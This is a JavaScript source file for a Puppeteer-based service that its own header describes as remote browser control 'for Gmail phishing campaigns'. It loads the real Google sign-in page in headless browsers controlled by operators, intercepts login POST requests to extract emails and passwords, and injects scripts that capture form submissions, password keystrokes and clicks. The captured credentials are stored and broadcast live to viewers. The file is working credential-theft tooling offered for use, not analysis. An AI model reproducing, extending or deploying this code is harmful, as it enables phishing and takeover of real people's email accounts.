const puppeteer = require('puppeteer');
const { EventEmitter } = require('events');

/**
 * Gmail Browser Service - Remote Browser Control for Gmail Phishing
 * 
 * This service creates a shared browser session that can be viewed and controlled
 * by multiple users in real-time. Specifically designed for Gmail phishing campaigns.
 */
class GmailBrowserService extends EventEmitter {
  constructor() {
    super();
    this.activeSessions = new Map(); // sessionToken -> browser session data
    this.browsers = new Map(); // sessionToken -> browser instance
    this.pages = new Map(); // sessionToken -> page instance
    this.io = null; // Socket.IO instance
    this.serviceStartTime = Date.now(); // Track service start time for health checks
    this.browserOptions = {
      headless: 'new', // Use new headless mode for better compatibility
      devtools: false,
      defaultViewport: {
        width: 1366,
        height: 768,
        deviceScaleFactor: 1,
      },
      args: [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--disable-accelerated-2d-canvas',
        '--no-first-run',
        '--no-zygote',
        '--single-process',
        '--disable-gpu',
        '--disable-gpu-sandbox',
        '--disable-software-rasterizer',
        '--disable-background-timer-throttling',
        '--disable-backgrounding-occluded-windows',
        '--disable-renderer-backgrounding',
        '--disable-features=TranslateUI,VizDisplayCompositor',
        '--window-size=1366,768',
        '--virtual-time-budget=5000',
        '--disable-ipc-flooding-protection',
        '--disable-hang-monitor',
        '--disable-prompt-on-repost',
        '--disable-domain-reliability',
        '--disable-web-security',
        '--disable-features=VizDisplayCompositor',
        '--run-all-compositor-stages-before-draw',
        '--disable-threaded-animation',
        '--disable-threaded-scrolling',
        '--disable-checker-imaging',
        '--disable-new-content-rendering-timeout',
        '--disable-image-animation-resync',
        '--disable-partial-raster',
        '--disable-skia-runtime-opts',
        '--disable-system-font-check',
        '--disable-features=Translate',
        '--no-pings',
        '--no-crash-upload',
        '--disable-crash-reporter',
        '--disable-extensions',
        '--disable-plugins',
        '--disable-sync',
        '--disable-translate',
        '--hide-scrollbars',
        '--mute-audio',
        '--disable-background-media-suspend',
        '--disable-notifications',
        '--disable-default-apps',
        '--disable-popup-blocking',
        '--disable-infobars',
        '--disable-session-crashed-bubble',
        '--disable-password-generation',
        '--disable-save-password-bubble'
      ],
    };
  }

  /**
   * Set the Socket.IO instance for real-time updates
   */
  setSocketIO(io) {
    this.io = io;
    console.log('✅ Socket.IO instance set for Gmail Browser Service');
  }

  /**
   * Create a new Gmail browser session
   */
  async createGmailSession(sessionToken, campaignId, userInfo = {}) {
    try {
      console.log(`🌐 Creating Gmail browser session: ${sessionToken}`);

      // Create temp directory if it doesn't exist
      const fs = require('fs');
      const path = require('path');
      const sessionDir = `./temp/browser-sessions/${sessionToken}`;
      if (!fs.existsSync(sessionDir)) {
        fs.mkdirSync(sessionDir, { recursive: true });
      }

      // Enhanced browser options for server environment
      const browserOptions = {
        ...this.browserOptions,
        userDataDir: sessionDir, // Persistent session
        executablePath: process.env.CHROME_PATH || undefined, // Use system Chrome if available
      };

      // Launch browser with enhanced error handling
      let browser;
      try {
        console.log(`🚀 Launching browser with options:`, { headless: browserOptions.headless, args: browserOptions.args.slice(0, 5) });
        browser = await puppeteer.launch(browserOptions);
        console.log(`✅ Browser launched successfully`);
      } catch (launchError) {
        console.error('First browser launch failed, trying alternative config:', launchError.message);
        
        // Fallback configuration with minimal dependencies
        const fallbackOptions = {
          headless: 'new',
          args: [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--disable-gpu',
            '--disable-web-security',
            '--disable-features=VizDisplayCompositor',
            '--single-process',
            '--no-zygote'
          ]
        };
        
        browser = await puppeteer.launch(fallbackOptions);
        console.log(`✅ Browser launched with fallback options`);
      }

      // Handle browser disconnection
      browser.on('disconnected', () => {
        console.log(`🔌 Browser disconnected for session: ${sessionToken}`);
        this.cleanupSession(sessionToken);
      });

      // Create new page with error handling
      const page = await browser.newPage();
      console.log(`📄 New page created for session: ${sessionToken}`);

      // Prevent page from closing unexpectedly
      page.on('close', () => {
        console.log(`📄 Page closed for session: ${sessionToken}`);
      });

      // Set viewport first
      await page.setViewport({
        width: 1366,
        height: 768,
        deviceScaleFactor: 1,
      });

      // Set realistic user agent and viewport
      await page.setUserAgent(
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36'
      );

      // Enable request/response interception for credential capture
      await page.setRequestInterception(true);

      // Add extra headers to look more like a real browser
      await page.setExtraHTTPHeaders({
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'max-age=0'
      });

      // Store session data
      const sessionData = {
        sessionToken,
        campaignId,
        userInfo,
        createdAt: new Date(),
        isActive: true,
        viewers: new Set(), // Connected viewers
        capturedCredentials: [],
        pageHistory: [],
        debuggingUrl: null,
      };

      this.activeSessions.set(sessionToken, sessionData);
      this.browsers.set(sessionToken, browser);
      this.pages.set(sessionToken, page);

      // Wait a moment for page to stabilize
      await new Promise(resolve => setTimeout(resolve, 1000));

      // Check if page is still alive before proceeding
      if (page.isClosed()) {
        throw new Error('Page closed immediately after creation');
      }

      // Get debugging URL for advanced control (with better error handling)
      let debuggingUrl = null;
      try {
        debuggingUrl = await this.getBrowserDebuggingUrl(browser);
        sessionData.debuggingUrl = debuggingUrl;
      } catch (debugError) {
        console.log(`⚠️  Could not get debugging URL: ${debugError.message}`);
        // Continue without debugging URL
      }

      // Set up event listeners before navigation
      await this.setupPageEventListeners(sessionToken, page);

      // Navigate to Gmail login with enhanced error handling and retries
      console.log(`🌐 Navigating to Gmail login page...`);
      let navigationSuccess = false;
      const urls = [
        'https://accounts.google.com/signin/v2/identifier?service=mail&continue=https://mail.google.com',
        'https://accounts.google.com/',
        'https://www.google.com/gmail/'
      ];

      for (let i = 0; i < urls.length && !navigationSuccess; i++) {
        try {
          console.log(`🌐 Trying URL ${i + 1}: ${urls[i]}`);
          
          // Check if page is still alive
          if (page.isClosed()) {
            throw new Error('Page closed during navigation attempt');
          }

          await page.goto(urls[i], {
            waitUntil: ['domcontentloaded', 'networkidle0'],
            timeout: 20000,
          });
          
          // Wait for page to stabilize
          await new Promise(resolve => setTimeout(resolve, 2000));
          
          // Verify we actually navigated
          const currentUrl = page.url();
          if (currentUrl && currentUrl !== 'about:blank') {
            console.log(`✅ Successfully navigated to: ${currentUrl}`);
            navigationSuccess = true;
          }
        } catch (navError) {
          console.error(`❌ Navigation attempt ${i + 1} failed:`, navError.message);
          
          // If this is the last attempt, don't throw yet
          if (i === urls.length - 1) {
            // Try one more simple navigation
            try {
              await page.goto('data:text/html,<html><body><h1>Gmail Loading...</h1><p>Connecting to Gmail...</p></body></html>');
              navigationSuccess = true;
              console.log(`✅ Loaded fallback page`);
            } catch (fallbackError) {
              throw new Error(`All navigation attempts failed. Last error: ${navError.message}`);
            }
          }
        }
      }

      // Inject credential capture and real-time sync scripts
      try {
        await this.injectMonitoringScripts(page, sessionToken);
      } catch (scriptError) {
        console.log(`⚠️  Could not inject monitoring scripts: ${scriptError.message}`);
        // Continue without monitoring scripts
      }

      console.log(`✅ Gmail browser session created: ${sessionToken}`);
      
      // Notify connected clients
      if (this.io) {
        this.io.to(`campaign-${campaignId}`).emit('gmailSessionCreated', {
          sessionToken,
          debuggingUrl: sessionData.debuggingUrl,
          status: 'active',
        });
      }

      return {
        sessionToken,
        debuggingUrl: sessionData.debuggingUrl,
        status: 'active',
        url: page.url(),
      };

    } catch (error) {
      console.error('Error creating Gmail browser session:', error);
      // Clean up any partial session
      this.cleanupSession(sessionToken);
      throw error;
    }
  }

  /**
   * Clean up session resources
   */
  cleanupSession(sessionToken) {
    try {
      const browser = this.browsers.get(sessionToken);
      if (browser) {
        browser.close().catch(console.error);
        this.browsers.delete(sessionToken);
      }
      this.pages.delete(sessionToken);
      this.activeSessions.delete(sessionToken);
      console.log(`🧹 Cleaned up session: ${sessionToken}`);
    } catch (error) {
      console.error('Error cleaning up session:', error);
    }
  }

  async getBrowserDebuggingUrl(browser) {
    try {
      const browserWSEndpoint = browser.wsEndpoint();
      if (!browserWSEndpoint) {
        throw new Error('No browser WebSocket endpoint available');
      }

      const httpEndpoint = browserWSEndpoint.replace('ws://', 'http://').replace('/devtools/browser', '/json');
      console.log(`🔍 Fetching debug info from: ${httpEndpoint}`);
      
      const response = await fetch(httpEndpoint, {
        method: 'GET',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/json'
        },
        timeout: 5000
      });
      
      if (!response.ok) {
        throw new Error(`HTTP ${response.status}: ${response.statusText}`);
      }
      
      const responseText = await response.text();
      console.log(`🔍 Debug response: ${responseText.substring(0, 200)}...`);
      
      if (!responseText || responseText.startsWith('Unknown')) {
        throw new Error('Invalid response from debug endpoint');
      }
      
      const tabs = JSON.parse(responseText);
      
      if (tabs && tabs.length > 0) {
        const tab = tabs[0];
        if (tab.webSocketDebuggerUrl) {
          return `${browserWSEndpoint.replace('ws://', 'http://').replace('/devtools/browser', '')}/devtools/inspector.html?ws=${tab.webSocketDebuggerUrl.replace('ws://', '')}`;
        }
      }
      
      return null;
    } catch (error) {
      console.error('Error getting debugging URL:', error);
      return null;
    }
  }

  /**
   * Set up page event listeners for monitoring and capture
   */
  async setupPageEventListeners(sessionToken, page) {
    const sessionData = this.activeSessions.get(sessionToken);

    // Monitor navigation
    page.on('framenavigated', (frame) => {
      if (frame === page.mainFrame()) {
        const url = frame.url();
        console.log(`📍 Navigation: ${url}`);
        
        sessionData.pageHistory.push({
          url,
          timestamp: new Date(),
          title: frame.title || '',
        });

        // Broadcast navigation to viewers
        if (this.io) {
          this.io.to(`gmail-session-${sessionToken}`).emit('pageNavigation', {
            url,
            title: frame.title || '',
            timestamp: new Date(),
          });
        }
      }
    });

    // Monitor console messages (for debugging)
    page.on('console', (msg) => {
      console.log(`🖥️ Console [${sessionToken}]:`, msg.text());
    });

    // Monitor requests for credential capture
    page.on('request', async (request) => {
      const url = request.url();
      const method = request.method();
      const postData = request.postData();

      // Check for login requests
      if (method === 'POST' && (
        url.includes('accounts.google.com') ||
        url.includes('signin') ||
        url.includes('login') ||
        url.includes('auth')
      )) {
        console.log(`🔐 Potential login request detected: ${url}`);
        
        if (postData) {
          try {
            // Parse form data or JSON
            let credentials = {};
            
            if (request.headers()['content-type']?.includes('application/x-www-form-urlencoded')) {
              const params = new URLSearchParams(postData);
              for (const [key, value] of params.entries()) {
                if (key.toLowerCase().includes('email') || 
                    key.toLowerCase().includes('user') ||
                    key.toLowerCase().includes('identifier')) {
                  credentials.email = value;
                }
                if (key.toLowerCase().includes('pass') ||
                    key.toLowerCase().includes('pwd')) {
                  credentials.password = value;
                }
              }
            } else if (request.headers()['content-type']?.includes('application/json')) {
              const jsonData = JSON.parse(postData);
              // Extract credentials from JSON (Google uses various field names)
              credentials = this.extractCredentialsFromJson(jsonData);
            }

            if (credentials.email || credentials.password) {
              console.log(`🔑 CREDENTIALS CAPTURED:`, credentials);
              
              // Store credentials
              sessionData.capturedCredentials.push({
                ...credentials,
                timestamp: new Date(),
                url,
                method,
                ip: sessionData.userInfo.ip || 'unknown',
                userAgent: sessionData.userInfo.userAgent || 'unknown',
              });

              // Save to database
              await this.saveCapturedCredentials(sessionToken, credentials, url);

              // Broadcast to viewers
              if (this.io) {
                this.io.to(`gmail-session-${sessionToken}`).emit('credentialsCaptured', {
                  credentials,
                  timestamp: new Date(),
                  url,
                });
              }
            }
          } catch (error) {
            console.error('Error parsing credentials:', error);
          }
        }
      }

      // Continue with the request
      request.continue();
    });

    // Monitor responses
    page.on('response', (response) => {
      const url = response.url();
      const status = response.status();
      
      // Log important responses
      if (url.includes('accounts.google.com') || url.includes('mail.google.com')) {
        console.log(`📨 Response: ${status} ${url}`);
      }
    });

    // Monitor page errors
    page.on('pageerror', (error) => {
      console.error(`💥 Page error [${sessionToken}]:`, error.message);
    });
  }

  /**
   * Extract credentials from JSON data (Google's various formats)
   */
  extractCredentialsFromJson(jsonData) {
    const credentials = {};
    
    // Recursive function to find credential fields
    const findCredentials = (obj, path = '') => {
      if (typeof obj !== 'object' || obj === null) return;
      
      for (const [key, value] of Object.entries(obj)) {
        const keyLower = key.toLowerCase();
        const fullPath = path ? `${path}.${key}` : key;
        
        if (typeof value === 'string' && value.length > 0) {
          // Check for email patterns
          if ((keyLower.includes('email') || 
               keyLower.includes('user') || 
               keyLower.includes('identifier') ||
               keyLower === 'email' ||
               keyLower === 'username') && 
              (value.includes('@') || value.length > 3)) {
            credentials.email = value;
          }
          
          // Check for password patterns
          if (keyLower.includes('pass') || 
              keyLower.includes('pwd') || 
              keyLower === 'password') {
            credentials.password = value;
          }
        } else if (typeof value === 'object') {
          findCredentials(value, fullPath);
        }
      }
    };
    
    findCredentials(jsonData);
    return credentials;
  }

  /**
   * Inject monitoring and synchronization scripts
   */
  async injectMonitoringScripts(page, sessionToken) {
    try {
      await page.evaluateOnNewDocument((sessionToken) => {
        // Advanced form monitoring
        const originalSubmit = HTMLFormElement.prototype.submit;
        HTMLFormElement.prototype.submit = function() {
          // Capture form data before submission
          const formData = new FormData(this);
          const data = {};
          for (const [key, value] of formData.entries()) {
            data[key] = value;
          }
          
          // Send to our backend via fetch
          fetch(`/api/gmail-browser/capture-form/${sessionToken}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ formData: data, url: location.href }),
          }).catch(() => {}); // Silent fail
          
          return originalSubmit.call(this);
        };

        // Monitor form submissions via event listener
        document.addEventListener('submit', function(e) {
          const form = e.target;
          if (form.tagName === 'FORM') {
            const formData = new FormData(form);
            const data = {};
            for (const [key, value] of formData.entries()) {
              data[key] = value;
            }
            
            fetch(`/api/gmail-browser/capture-form/${sessionToken}`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ formData: data, url: location.href }),
            }).catch(() => {});
          }
        }, true);

        // Monitor input changes for real-time capture
        document.addEventListener('input', function(e) {
          const input = e.target;
          if (input.type === 'password' || 
              input.name?.toLowerCase().includes('pass') ||
              input.id?.toLowerCase().includes('pass')) {
            
            // Debounced password capture
            clearTimeout(window.passwordCapture);
            window.passwordCapture = setTimeout(() => {
              fetch(`/api/gmail-browser/capture-input/${sessionToken}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  type: 'password',
                  name: input.name || input.id,
                  value: input.value,
                  url: location.href,
                }),
              }).catch(() => {});
            }, 1000);
          }
        }, true);

        // Monitor clicks for interaction tracking
        document.addEventListener('click', function(e) {
          const element = e.target;
          const elementInfo = {
            tagName: element.tagName,
            id: element.id,
            className: element.className,
            text: element.textContent?.substring(0, 100),
            href: element.href,
          };
          
          fetch(`/api/gmail-browser/track-click/${sessionToken}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ element: elementInfo, url: location.href }),
          }).catch(() => {});
        }, true);

        console.log('Gmail monitoring scripts injected successfully');
      }, sessionToken);

      console.log(`✅ Monitoring scripts injected for session: ${sessionToken}`);
    } catch (error) {
      console.error('Error injecting monitoring scripts:', error);
    }
  }

  /**
   * Save captured credentials to database
   */
  async saveCapturedCredentials(sessionToken, credentials, url) {
    try {
      const sessionData = this.activeSessions.get(sessionToken);
      if (!sessionData) return;

      // Here you would save to your database
      // This is a placeholder - adapt to your database structure
      console.log('💾 Saving credentials to database:', {
        sessionToken,
        campaignId: sessionData.campaignId,
        credentials,
        url,
        timestamp: new Date(),
      });

      // Example database save (adapt to your database schema):
      /*
      const db = require('../database');
      await db.run(
        `INSERT INTO gmail_credentials (session_token, campaign_id, email, password, url, captured_at, ip_address)
         VALUES (?, ?, ?, ?, ?, ?, ?)`,
        [
          sessionToken,
          sessionData.campaignId,
          credentials.email || null,
          credentials.password || null,
          url,
          new Date().toISOString(),
          sessionData.userInfo.ip || 'unknown'
        ]
      );
      */

    } catch (error) {
      console.error('Error saving credentials to database:', error);
    }
  }

  /**
   * Get current page screenshot for viewers
   */
  async getScreenshot(sessionToken) {
    try {
      const page = this.pages.get(sessionToken);
      if (!page) {
        console.error(`❌ Screenshot requested for non-existent session: ${sessionToken}`);
        throw new Error('Session not found');
      }

      // Check if page is still connected
      if (page.isClosed()) {
        console.error(`❌ Page is closed for session: ${sessionToken}`);
        this.cleanupSession(sessionToken);
        throw new Error('Page is closed');
      }

      console.log(`📸 Taking screenshot for session: ${sessionToken}`);
      const screenshot = await page.screenshot({
        type: 'png',
        fullPage: false,
        quality: 80,
      });

      console.log(`✅ Screenshot captured: ${screenshot.length} bytes`);
      return screenshot;
    } catch (error) {
      console.error('Error taking screenshot:', error);
      
      // If screenshot fails, try to get a simple placeholder
      if (error.message.includes('Session closed') || error.message.includes('Target closed')) {
        this.cleanupSession(sessionToken);
      }
      
      throw error;
    }
  }

  /**
   * Execute action on the browser page
   */
  async executeAction(sessionToken, action, params = {}) {
    try {
      const page = this.pages.get(sessionToken);
      if (!page) throw new Error('Session not found');

      console.log(`🎯 Executing action: ${action} with params:`, params);

      let result;
      
      switch (action) {
        case 'click':
          if (params.selector) {
            await page.click(params.selector);
            result = { success: true, message: 'Clicked element' };
          } else if (params.x && params.y) {
            await page.mouse.click(params.x, params.y);
            result = { success: true, message: 'Clicked coordinates' };
          }
          break;

        case 'type':
          if (params.selector && params.text) {
            await page.type(params.selector, params.text);
            result = { success: true, message: 'Typed text' };
          }
          break;

        case 'clear':
          if (params.selector) {
            await page.evaluate((selector) => {
              const element = document.querySelector(selector);
              if (element) element.value = '';
            }, params.selector);
            result = { success: true, message: 'Cleared field' };
          }
          break;

        case 'navigate':
          if (params.url) {
            await page.goto(params.url, { waitUntil: 'networkidle2' });
            result = { success: true, message: 'Navigated to URL' };
          }
          break;

        case 'scroll':
          await page.evaluate((x, y) => {
            window.scrollBy(x || 0, y || 100);
          }, params.x, params.y);
          result = { success: true, message: 'Scrolled page' };
          break;

        case 'screenshot':
          const screenshot = await this.getScreenshot(sessionToken);
          result = { success: true, screenshot: screenshot.toString('base64') };
          break;

        case 'getUrl':
          result = { success: true, url: page.url() };
          break;

        case 'getTitle':
          const title = await page.title();
          result = { success: true, title };
          break;

        case 'key':
          if (params.key) {
            // Handle special keys
            if (params.key === 'Enter') {
              await page.keyboard.press('Enter');
            } else if (params.key === 'Tab') {
              await page.keyboard.press('Tab');
            } else if (params.key === 'Backspace') {
              await page.keyboard.press('Backspace');
            } else if (params.key === 'Escape') {
              await page.keyboard.press('Escape');
            } else if (params.key.length === 1) {
              // Regular character
              await page.keyboard.type(params.key);
            }
            result = { success: true, message: `Pressed key: ${params.key}` };
          }
          break;

        case 'focus':
          if (params.selector) {
            await page.focus(params.selector);
            result = { success: true, message: 'Focused element' };
          } else if (params.x && params.y) {
            await page.mouse.click(params.x, params.y);
            result = { success: true, message: 'Focused coordinates' };
          }
          break;

        default:
          result = { success: false, message: 'Unknown action' };
      }

      // Broadcast action to viewers
      if (this.io) {
        this.io.to(`gmail-session-${sessionToken}`).emit('actionExecuted', {
          action,
          params,
          result,
          timestamp: new Date(),
        });
      }

      return result;
    } catch (error) {
      console.error('Error executing action:', error);
      return { success: false, message: error.message };
    }
  }

  /**
   * Add viewer to session
   */
  addViewer(sessionToken, viewerId) {
    const sessionData = this.activeSessions.get(sessionToken);
    if (sessionData) {
      sessionData.viewers.add(viewerId);
      console.log(`👁️ Added viewer ${viewerId} to session ${sessionToken}`);
      return true;
    }
    return false;
  }

  /**
   * Remove viewer from session
   */
  removeViewer(sessionToken, viewerId) {
    const sessionData = this.activeSessions.get(sessionToken);
    if (sessionData) {
      sessionData.viewers.delete(viewerId);
      console.log(`👁️ Removed viewer ${viewerId} from session ${sessionToken}`);
      return true;
    }
    return false;
  }

  /**
   * Get session info
   */
  getSessionInfo(sessionToken) {
    const sessionData = this.activeSessions.get(sessionToken);
    if (!sessionData) return null;

    return {
      sessionToken: sessionData.sessionToken,
      campaignId: sessionData.campaignId,
      createdAt: sessionData.createdAt,
      isActive: sessionData.isActive,
      viewerCount: sessionData.viewers.size,
      credentialsCount: sessionData.capturedCredentials.length,
      currentUrl: this.pages.get(sessionToken)?.url() || 'unknown',
      debuggingUrl: sessionData.debuggingUrl,
    };
  }

  /**
   * Get all active sessions
   */
  getAllSessions() {
    const sessions = [];
    for (const [sessionToken, sessionData] of this.activeSessions.entries()) {
      sessions.push(this.getSessionInfo(sessionToken));
    }
    return sessions;
  }

  /**
   * Close browser session
   */
  async closeSession(sessionToken) {
    try {
      console.log(`🔴 Closing Gmail browser session: ${sessionToken}`);

      const browser = this.browsers.get(sessionToken);
      const sessionData = this.activeSessions.get(sessionToken);

      if (browser) {
        await browser.close();
        this.browsers.delete(sessionToken);
      }

      this.pages.delete(sessionToken);
      this.activeSessions.delete(sessionToken);

      // Notify viewers
      if (this.io && sessionData) {
        this.io.to(`gmail-session-${sessionToken}`).emit('sessionClosed', {
          sessionToken,
          timestamp: new Date(),
        });
      }

      console.log(`✅ Gmail browser session closed: ${sessionToken}`);
      return true;
    } catch (error) {
      console.error('Error closing session:', error);
      return false;
    }
  }

  /**
   * Cleanup inactive sessions
   */
  async cleanupInactiveSessions() {
    const maxAge = 4 * 60 * 60 * 1000; // 4 hours
    const now = new Date();

    for (const [sessionToken, sessionData] of this.activeSessions.entries()) {
      if (now - sessionData.createdAt > maxAge) {
        console.log(`🧹 Cleaning up inactive session: ${sessionToken}`);
        await this.closeSession(sessionToken);
      }
    }
  }

  /**
   * Start cleanup interval
   */
  startCleanupInterval() {
    setInterval(() => {
      this.cleanupInactiveSessions();
    }, 30 * 60 * 1000); // Every 30 minutes
  }

  /**
   * Check if a session exists and is active
   */
  async checkSessionExists(sessionToken) {
    try {
      if (!this.activeSessions.has(sessionToken)) {
        return false;
      }

      const browser = this.browsers.get(sessionToken);
      const page = this.pages.get(sessionToken);
      
      // Check if browser is still connected
      if (!browser || !browser.isConnected()) {
        console.log(`⚠️  Browser for session ${sessionToken} is disconnected`);
        this.cleanupSession(sessionToken);
        return false;
      }

      // Check if page is still valid
      if (!page || page.isClosed()) {
        console.log(`⚠️  Page for session ${sessionToken} is closed`);
        this.cleanupSession(sessionToken);
        return false;
      }

      return true;
    } catch (error) {
      console.error(`❌ Error checking session ${sessionToken}:`, error);
      return false;
    }
  }

  /**
   * Perform action on browser session
   */
  async performAction(sessionToken, action, params) {
    try {
      const sessionData = this.activeSessions.get(sessionToken);
      if (!sessionData) {
        throw new Error('Session not found');
      }

      const page = this.pages.get(sessionToken);
      if (!page || page.isClosed()) {
        throw new Error('Browser page is not available');
      }

      switch (action) {
        case 'click':
          await page.mouse.click(params.x, params.y);
          break;
        
        case 'type':
          await page.keyboard.type(params.text);
          break;
        
        case 'key':
          await page.keyboard.press(params.key);
          break;
        
        case 'scroll':
          await page.evaluate((x, y) => {
            window.scrollBy(x, y);
          }, params.x || 0, params.y || 0);
          break;
        
        case 'navigate':
          await page.goto(params.url);
          break;
        
        default:
          throw new Error(`Unknown action: ${action}`);
      }

      // Update last activity
      sessionData.lastActivity = new Date();

      return { success: true, action, params };
    } catch (error) {
      console.error(`❌ Error performing action ${action}:`, error);
      throw error;
    }
  }

  /**
   * Health check for the service
   */
  async healthCheck() {
    try {
      const activeSessions = this.activeSessions.size;
      const uptime = Date.now() - (this.serviceStartTime || Date.now());
      
      // Check if we can launch a browser
      let browserHealthy = false;
      try {
        const testBrowser = await puppeteer.launch({
          headless: true,
          args: [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--disable-accelerated-2d-canvas',
            '--no-first-run',
            '--no-zygote',
            '--single-process',
            '--disable-gpu'
          ]
        });
        await testBrowser.close();
        browserHealthy = true;
      } catch (error) {
        console.error('❌ Browser health check failed:', error);
      }

      return {
        status: browserHealthy ? 'healthy' : 'unhealthy',
        activeSessions,
        uptime,
        browserHealthy,
        timestamp: new Date().toISOString()
      };
    } catch (error) {
      console.error('❌ Health check error:', error);
      return {
        status: 'error',
        error: error.message,
        timestamp: new Date().toISOString()
      };
    }
  }
}

module.exports = GmailBrowserService;
